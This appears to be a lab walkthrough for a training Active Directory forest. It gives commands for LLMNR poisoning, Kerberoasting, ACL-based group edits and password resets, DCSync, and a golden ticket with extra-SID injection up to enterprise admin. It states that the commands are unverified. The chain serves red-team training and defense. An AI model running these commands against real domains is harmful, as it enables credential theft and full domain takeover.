# harbor solution - redStackPRO edition

`harbor` is redStackPRO's own range, not a GOAD lab, so it has no upstream
write-up to be faithful to. It is a small corporate forest: a root domain that
holds the enterprise admins and a child domain that holds the people who actually
work there, joined by the parent-child trust every real forest has. The attack
path is the ordinary one, which is why it is worth defending: a phished
workstation user finds a kerberoastable service account, that account can write
to a group it should not, the group can force a password change on the child
domain admin, and that child admin walks the trust into the root.

> **Status: authored from the lab's own template, not yet run against a live
> range.** Every host, user, credential and ACL edge below was read out of
> `frontend/public/harbor.json`. The commands follow the usual redStackPRO shape
> but carry no "Live verification" block and should not be trusted the way the
> validated parts of the [GOAD series](../goad/README.md) can be. Verify on a
> deploy before relying on it.

## Methodology

Same external red team framing as the [GOAD series](../goad/README.md), see
[[range-access-model]]: the jumpbox is the only public host, every range backend
is private, and the operator works through a beacon's SOCKS proxy
([[tests-run-through-beacon]]). Initial access is a beacon in patient zero's
context, delivered through the Guacamole portal, not an SSH foothold on the
jumpbox. Commands below assume `proxychains` over that SOCKS and the forest names
in static hosts entries (this range is on `172.20.10.0/24`, deliberately nothing
like `192.168.56.0/24`, so do not let any tool assume the GOAD subnet).

## Provider differences

redStackPRO compiles this range for cloud backends (`gcp`, `aws`, `azure`) and
on-prem backends (`proxmox`, `esxi`). The attack chain is identical on all of
them; what differs is the operator's path to the range, because the on-prem
backends declare fewer network capabilities (`src/redstackpro/schema/registry/providers/`).

| capability | cloud (gcp/aws/azure) | on-prem (proxmox/esxi) |
|------------|-----------------------|------------------------|
| public address | allocated: the jumpbox gets an external IP | none: reachability depends on the operator's own network and any upstream NAT or firewall |
| private DNS | managed zone, hosts resolve by name | none: use static hosts entries |
| network peering | managed: a jumpbox or collector can serve across the project boundary | none: joining networks is the host network's routing, which redStackPRO does not control |
| host firewall | per-VM firewall | proxmox has one, esxi has none (layer-2 VLAN isolation only) |

- **Range access.** On cloud the jumpbox has an allocated (per-deploy, ephemeral)
  public address, read from `RANGE-BRIEFING.md`. On on-prem there is no allocated
  external IP: reach the jumpbox over the operator's own network or VPN.
- **Name resolution.** On cloud the range can resolve through managed private DNS.
  On on-prem there is no managed zone, so populate static hosts entries from the
  internal IPs below. Static entries work on cloud too and keep the commands
  identical.

Azure is a preview backend: it allocates public addresses, but its private DNS
and peering modules are not built yet (`azure.yaml`), so on azure treat name
resolution as on-prem (static hosts entries) and expect no managed peering.

## Topology

Two domains in one forest, joined by a bidirectional, transitive parent-child
trust: `harbor.corp` (HARBOR) is the root, `freight.harbor.corp` (FREIGHT) is the
child. Four Windows hosts and a jumpbox on one flat subnet, `172.20.10.0/24`
inside `172.20.0.0/16`. The internal addresses are pinned in the template.

| host | AD name | domain | range IP | role in the chain |
|------|---------|--------|----------|-------------------|
| hq-dc01 | HQ-DC01 | harbor.corp (root) | 172.20.10.10 | root DC, `ldap_signing_off`, holds the enterprise admins |
| fr-dc01 | FR-DC01 | freight.harbor.corp | 172.20.10.11 | child DC, `llmnr_poisoning`, `nbtns_poisoning` |
| fr-app01 | FR-APP01 | freight.harbor.corp | 172.20.10.20 | member, MSSQL + IIS, `unconstrained_delegation`, `openshares`, no EDR |
| fr-wks01 | FR-WKS01 | freight.harbor.corp | 172.20.10.30 | Windows 10 workstation, `stored_credential`, patient zero's host |
| jumpbox | - | - | 172.20.10.4 | foothold, Guacamole, SSH, range CA |

Cast:

- **harbor.corp (root):** `roland.hale` is the **enterprise admin**, the account
  the whole path is aimed at. `svc.backup` is a plain user with an MSSQL SPN
  (`MSSQLSvc/backup.harbor.corp:1433`), **kerberoastable** and
  `password_never_expires`, so the root is roastable directly and the trust is not
  the only way up.
- **freight.harbor.corp (child):** `dana.brooks` is **patient zero**, an ordinary
  user with no rights worth having (assumed-breach seed, lab password in the
  briefing). `svc.reports` has an HTTP SPN
  (`HTTP/reports.freight.harbor.corp`), is **kerberoastable** and carries a
  **weak password**. `mia.chen` is an ordinary member of the `App Maintainers`
  group. `eric.vance` is the **child domain admin**, the rung below the forest.

Planted ACL edges in freight (the escalation chain):

```
svc.reports      --GenericWrite-->              App Maintainers   (group)
App Maintainers  --ForceChangePassword-->       eric.vance        (child DA)
```

## The chain

Read passwords and exact names from this deploy's `RANGE-BRIEFING.md`; the names
below are the template's.

### 0. Foothold as patient zero

The engagement starts as `dana.brooks` on the workstation `fr-wks01`, reached
through the portal's patient-zero tile as in the GOAD methodology. She is a plain
`freight.harbor.corp` domain user. `fr-wks01` also carries `stored_credential`:
check the Windows Credential Manager on the box for a saved credential that gives
an early second identity.

```
proxychains cmdkey /list                 # from a beacon on fr-wks01
# and, from the operator side once you have a domain user:
proxychains bloodhound-python -d freight.harbor.corp -u dana.brooks -p '<pw>' \
  -c all -ns 172.20.10.11
```

### 1. Poison the segment for a first captured hash (optional)

`fr-dc01` declares `llmnr_poisoning` and `nbtns_poisoning`, so the flat subnet
answers LLMNR and NBT-NS broadcasts. Run Responder over the pivot to catch a
NetNTLM hash from routine name-resolution failures, an alternative first
credential if the patient-zero context is thin:

```
proxychains responder -I <iface>         # capture NetNTLMv2, then crack offline
```

### 2. Kerberoast the child, crack the weak password

`svc.reports` has an SPN and a weak password, so it roasts and cracks quickly.
This is the account the ACL chain hangs off.

```
proxychains GetUserSPNs.py -dc-ip 172.20.10.11 -request \
  'freight.harbor.corp/dana.brooks:<pw>'
# crack the svc.reports ticket; the password is a common, guessable one
hashcat -m 13100 svc.reports.tgs wordlist.txt
```

### 3. Abuse the ACL: GenericWrite then ForceChangePassword

`svc.reports` holds **GenericWrite** over the `App Maintainers` group, so add a
principal you control (svc.reports itself, or a user you own) to it. `App
Maintainers` then holds **ForceChangePassword** over `eric.vance`, the child
domain admin, so reset his password:

```
proxychains bloodyAD --host 172.20.10.11 -d freight.harbor.corp \
  -u svc.reports -p '<cracked-pw>' add groupMember 'App Maintainers' svc.reports
# re-authenticate so the new group rides the ticket, then:
proxychains bloodyAD --host 172.20.10.11 -d freight.harbor.corp \
  -u svc.reports -p '<cracked-pw>' set password eric.vance '<new-pw>'
```

Resetting a real account is destructive to the lab's story; note the original
from the briefing so the range stays usable for the next run.

### 4. Child domain admin

Authenticate as `eric.vance` and confirm domain admin on
`freight.harbor.corp` (DCSync against `fr-dc01`, or a beacon on it as
FREIGHT\Administrator).

```
proxychains secretsdump.py 'freight.harbor.corp/eric.vance:<new-pw>@172.20.10.11'
```

### 5. Walk the trust into the root

The `harbor.corp` <-> `freight.harbor.corp` trust is parent-child, bidirectional
and transitive. A child domain admin escalates to the forest root the classic
way: pull the child `krbtgt`, forge a golden ticket that includes the root's
Enterprise Admins SID (SID-history injection across the intra-forest trust), and
use it against the root DC `hq-dc01`. The payoff is `roland.hale`, the enterprise
admin.

```
# with the child krbtgt hash and the root domain SID:
proxychains ticketer.py -nthash <child-krbtgt> -domain freight.harbor.corp \
  -domain-sid <freight-sid> -extra-sid <harbor-sid>-519 hq-admin
proxychains secretsdump.py -k -no-pass hq-dc01.harbor.corp   # DCSync the root
```

### Alternate ways up

- **Roast the root directly.** `svc.backup` in `harbor.corp` is kerberoastable,
  so a roast against the root DC is a second path that does not depend on the
  trust hop. It only lands if the password cracks.
- **Unconstrained delegation on fr-app01.** `fr-app01` is trusted for
  unconstrained delegation. Coerce a domain controller to authenticate to it
  (for example with the printer bug), capture the DC's TGT from LSASS, and use it
  for DCSync. This is a member-server path to domain compromise.
- **Open shares on fr-app01.** `openshares` means readable SMB shares to loot for
  credentials, scripts or config; a common source of the next credential.

## Detection note

`fr-app01` ships with **no EDR**; the two DCs and the workstation run Defender.
The unconstrained-delegation and open-share activity on `fr-app01` is therefore
the quietest part of the chain, while the ACL writes (4728/4724 on `fr-dc01`) and
the Kerberoast (4769 with RC4) are the loud, detectable steps on the monitored
hosts.

## Step results

| step | result | notes |
|------|--------|-------|
| 0 foothold as dana.brooks | | patient zero, `stored_credential` on fr-wks01 |
| 1 LLMNR/NBT-NS poisoning | | optional first hash |
| 2 kerberoast svc.reports | | weak password, cracks |
| 3 GenericWrite then ForceChangePassword | | freight ACL chain |
| 4 child domain admin (eric.vance) | | |
| 5 trust hop to enterprise admin | | golden ticket + extra-SID |
| alt roast svc.backup (root) | | direct path up |
| alt unconstrained delegation (fr-app01) | | coerce a DC |

Attribution: harbor is a redStackPRO original. Built and documented in our own
words.
